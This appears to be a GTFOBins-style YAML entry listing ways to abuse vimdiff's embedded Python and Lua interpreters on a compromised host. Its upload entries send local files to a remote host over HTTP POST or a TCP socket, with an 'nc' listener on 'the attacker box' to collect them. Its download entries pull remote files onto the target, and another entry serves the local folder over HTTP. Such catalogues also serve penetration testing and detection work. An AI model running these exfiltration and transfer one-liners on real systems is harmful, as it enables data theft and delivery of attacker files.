---
functions:
  file-upload:
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        vimdiff -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
        else: import urllib as u, urllib2 as r
        r.urlopen(e["$PATH"], bytes(u.urlencode({"d":open(e["$LFILE"]).read()}).encode()))
        vim.command(":q!")'
    - description: Send a local file via TCP. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
      code: |
        vimdiff -c ':lua local f=io.open(os.getenv("$LFILE"), 'rb')
          local d=f:read("*a")
          io.close(f);
          local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("$RHOST"),os.getenv("$RPORT"));
          t:send(d);
          t:close();'
  server:
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.
      code: |
        vimdiff -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import http.server as s, socketserver as ss
        else: import SimpleHTTPServer as s, SocketServer as ss
        ss.TCPServer(("", int(e["$LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()
        vim.command(":q!")'
  file-download:
    - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.
      code: |
        vimdiff -c ':py import vim,sys; from os import environ as e
        if sys.version_info.major == 3: import urllib.request as r
        else: import urllib as r
        r.urlretrieve(e["$RPATH"], e["$LFILE"])
        vim.command(":q!")'
    - description: Fetch a remote file via TCP. Run `nc target.com 4444 < "file_to_send"` on the attacker box to send the file. This requires that `vimdiff` is compiled with Lua support and that `lua-socket` is installed.
      code: |
        vimdiff -c ':lua local k=require("socket");
          local s=assert(k.bind("*",os.getenv("$LPORT")));
          local c=s:accept();
          local d,x=c:receive("*a");
          c:close();
          local f=io.open(os.getenv("$NFILE"), "wb");
          f:write(d);
          io.close(f);'
---
